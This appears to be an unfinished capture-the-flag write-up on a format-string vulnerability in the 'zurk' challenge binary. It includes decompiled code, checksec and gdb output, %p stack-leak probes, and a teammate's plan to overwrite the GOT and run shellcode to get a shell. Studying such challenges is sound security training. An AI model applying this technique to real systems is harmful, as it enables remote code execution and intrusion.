zurk
nc binary.utctf.live 9003

Download pwnable and libc-2.23.so.
Using ghidra as usual, as my go-to decompiler:

void do_move(void)

{
  int iVar1;
  size_t sVar2;
  char local_48 [64];
  
  puts("What would you like to do?");
  fgets(local_48,0x32,stdin);
  sVar2 = strcspn(local_48,"\n");
  local_48[sVar2] = '\0';
  iVar1 = strcmp(local_48,"go west");
  if (iVar1 == 0) {
    puts("You move west to arrive in a cave dimly lit by torches.");
    puts("The cave two tunnels, one going east and the other going west.");
  }
  else {
    iVar1 = strcmp(local_48,"go east");
    if (iVar1 == 0) {
      puts("You move east to arrive in a cave dimly lit by torches.");
      puts("The cave two tunnels, one going east and the other going west.");
    }
    else {
      printf(local_48);
      puts(" is not a valid instruction.");
    }
  }
  return;
}

void main(void)
{
  welcome();
  do {
    do_move();
  } while( true );
}

Here's a printf with no format string, so that's our target:

```
    else {
      printf(local_48);
      puts(" is not a valid instruction.");
    }
```

user@kali:~/Downloads/zurk$ checksec pwnable
[*] '/home/user/Downloads/zurk/pwnable'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments

user@kali:~/Downloads/zurk$ ropper --file pwnable --search "pop rdi"
[INFO] Load gadgets for section: PHDR
[LOAD] loading... 100%
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[INFO] Load gadgets for section: GNU_STACK
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: pwnable
0x00000000004007e3: pop rdi; ret; 

Might need to use that rop gadget somehow? We'll see.

user@kali:~/Downloads/zurk$ gdb pwnable -q
Reading symbols from pwnable...
(No debugging symbols found in pwnable)
(gdb) run
Starting program: /home/user/Downloads/zurk/pwnable 
Welcome to the game of Zurk!
You awaken in a cave dimly lit by torches.
The cave two tunnels, one going east and the other going west.
What would you like to do?
%p
0x4008f8 is not a valid instruction.
What would you like to do?
^C
Program received signal SIGINT, Interrupt.
0x00007ffff7edd881 in read () from /lib/x86_64-linux-gnu/libc.so.6
(gdb) break do_move
Breakpoint 1 at 0x4006c9
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/Downloads/zurk/pwnable 
Welcome to the game of Zurk!
You awaken in a cave dimly lit by torches.
The cave two tunnels, one going east and the other going west.

Breakpoint 1, 0x00000000004006c9 in do_move ()
(gdb) disass
Dump of assembler code for function do_move:
   0x00000000004006c5 <+0>:     push   %rbp
   0x00000000004006c6 <+1>:     mov    %rsp,%rbp
=> 0x00000000004006c9 <+4>:     sub    $0x40,%rsp
   0x00000000004006cd <+8>:     mov    $0x400897,%edi
   0x00000000004006d2 <+13>:    callq  0x400520 <puts@plt>
   0x00000000004006d7 <+18>:    mov    0x200982(%rip),%rdx        # 0x601060 <stdin@@GLIBC_2.2.5>
   0x00000000004006de <+25>:    lea    -0x40(%rbp),%rax
   0x00000000004006e2 <+29>:    mov    $0x32,%esi
   0x00000000004006e7 <+34>:    mov    %rax,%rdi
   0x00000000004006ea <+37>:    callq  0x400560 <fgets@plt>
   0x00000000004006ef <+42>:    lea    -0x40(%rbp),%rax
   0x00000000004006f3 <+46>:    mov    $0x4008b2,%esi
   0x00000000004006f8 <+51>:    mov    %rax,%rdi
   0x00000000004006fb <+54>:    callq  0x400540 <strcspn@plt>
   0x0000000000400700 <+59>:    movb   $0x0,-0x40(%rbp,%rax,1)
   0x0000000000400705 <+64>:    lea    -0x40(%rbp),%rax
   0x0000000000400709 <+68>:    mov    $0x4008b4,%esi
   0x000000000040070e <+73>:    mov    %rax,%rdi
   0x0000000000400711 <+76>:    callq  0x400570 <strcmp@plt>
   0x0000000000400716 <+81>:    test   %eax,%eax
   0x0000000000400718 <+83>:    jne    0x400730 <do_move+107>
   0x000000000040071a <+85>:    mov    $0x4008c0,%edi
   0x000000000040071f <+90>:    callq  0x400520 <puts@plt>
   0x0000000000400724 <+95>:    mov    $0x400858,%edi
   0x0000000000400729 <+100>:   callq  0x400520 <puts@plt>
   0x000000000040072e <+105>:   jmp    0x400776 <do_move+177>
   0x0000000000400730 <+107>:   lea    -0x40(%rbp),%rax
   0x0000000000400734 <+111>:   mov    $0x4008f8,%esi
   0x0000000000400739 <+116>:   mov    %rax,%rdi
   0x000000000040073c <+119>:   callq  0x400570 <strcmp@plt>
   0x0000000000400741 <+124>:   test   %eax,%eax
   0x0000000000400743 <+126>:   jne    0x40075b <do_move+150>
   0x0000000000400745 <+128>:   mov    $0x400900,%edi
   0x000000000040074a <+133>:   callq  0x400520 <puts@plt>
   0x000000000040074f <+138>:   mov    $0x400858,%edi
   0x0000000000400754 <+143>:   callq  0x400520 <puts@plt>
   0x0000000000400759 <+148>:   jmp    0x400776 <do_move+177>
   0x000000000040075b <+150>:   lea    -0x40(%rbp),%rax
   0x000000000040075f <+154>:   mov    %rax,%rdi
   0x0000000000400762 <+157>:   mov    $0x0,%eax
   0x0000000000400767 <+162>:   callq  0x400530 <printf@plt>
   0x000000000040076c <+167>:   mov    $0x400938,%edi
   0x0000000000400771 <+172>:   callq  0x400520 <puts@plt>
   0x0000000000400776 <+177>:   nop
   0x0000000000400777 <+178>:   leaveq 
   0x0000000000400778 <+179>:   retq   
End of assembler dump.
(gdb) break *0x0000000000400767
Breakpoint 2 at 0x400767
(gdb) break *0x0000000000400771
Breakpoint 3 at 0x400771
(gdb) cont
Continuing.
What would you like to do?
%p

Breakpoint 2, 0x0000000000400767 in do_move ()
(gdb) info reg
rax            0x0                 0
rbx            0x0                 0
rcx            0xffffffff          4294967295
rdx            0x67                103
rsi            0x4008f8            4196600
rdi            0x7fffffffdbd0      140737488346064
rbp            0x7fffffffdc10      0x7fffffffdc10
rsp            0x7fffffffdbd0      0x7fffffffdbd0
r8             0x4008b0            4196528
r9             0x7ffff7fb3500      140737353823488
r10            0x7ffff7fb3500      140737353823488
r11            0x246               582
r12            0x400590            4195728
r13            0x7fffffffdd00      140737488346368
r14            0x0                 0
r15            0x0                 0
rip            0x400767            0x400767 <do_move+162>
eflags         0x286               [ PF SF IF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
(gdb) cont
Continuing.

Breakpoint 3, 0x0000000000400771 in do_move ()
(gdb) clear *0x0000000000400771
Deleted breakpoint 3 
(gdb) cont
Continuing.
0x4008f8 is not a valid instruction.

Breakpoint 1, 0x00000000004006c9 in do_move ()

Alright, so we just fed it '%p' as input and got it to print out 0x4008f8, which was the contents of rsi when we hit the printf().
rsi = register source index

We can dump as much from the stack as we want with this method:

(gdb) cont
Continuing.
What would you like to do?
%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p

Breakpoint 2, 0x0000000000400767 in do_move ()
(gdb) x/40xw $rsp-16
0x7fffffffdbc0: 0x00400590      0x00000000      0x00400741      0x00000000
0x7fffffffdbd0: 0x25207025      0x70252070      0x20702520      0x25207025
0x7fffffffdbe0: 0x70252070      0x20702520      0x25207025      0x70252070
0x7fffffffdbf0: 0x20702520      0x25207025      0x70252070      0x00702520
0x7fffffffdc00: 0x00000000      0x00000000      0x004006c2      0x00000000
0x7fffffffdc10: 0xffffdc20      0x00007fff      0x0040069e      0x00000000
0x7fffffffdc20: 0x00400780      0x00000000      0xf7e18bbb      0x00007fff
0x7fffffffdc30: 0xf7fa84d8      0x00007fff      0xffffdd08      0x00007fff
0x7fffffffdc40: 0xf7f755a8      0x00000001      0x00400686      0x00000000
0x7fffffffdc50: 0x00000000      0x00000000      0xdc6e507f      0x8b5ea73f
(gdb) info reg
rax            0x0                 0
rbx            0x0                 0
rcx            0xfffff7fb          4294965243
rdx            0x67                103
rsi            0x4008f8            4196600
rdi            0x7fffffffdbd0      140737488346064
rbp            0x7fffffffdc10      0x7fffffffdc10
rsp            0x7fffffffdbd0      0x7fffffffdbd0
r8             0x4008b0            4196528
r9             0x7ffff7fb3500      140737353823488
r10            0x7ffff7fb3500      140737353823488
r11            0x246               582
r12            0x400590            4195728
r13            0x7fffffffdd00      140737488346368
r14            0x0                 0
r15            0x0                 0
rip            0x400767            0x400767 <do_move+162>
eflags         0x286               [ PF SF IF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
(gdb) cont
Continuing.
0x4008f8 0x67 0xfffff7fb 0x4008b0 0x7ffff7fb3500 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x702520702520
7025 0x2520702520702520 0x70252070252070 (nil) 0x4006c2 0x7fffffffdc20 0x40069e 0x400780 is not a valid instruction.

Breakpoint 1, 0x00000000004006c9 in do_move ()

We can use this to write or read from arbitrary addresses... but where are we going to find the flag?

egan  12:45 PM
this is pwnable, we need to get a shell

egan  12:47 PM
need to put some shellcode on the stack with fgets, use printf vuln to change GOT to have do_move call our code, however because of ASLR we do not know the stack address, however because this is a loop, we can send multiple payloads, so i guess we first use this vuln to figure out where the stack is in memory, then when we loop back we put in our exploit and call it since we know where the stack is


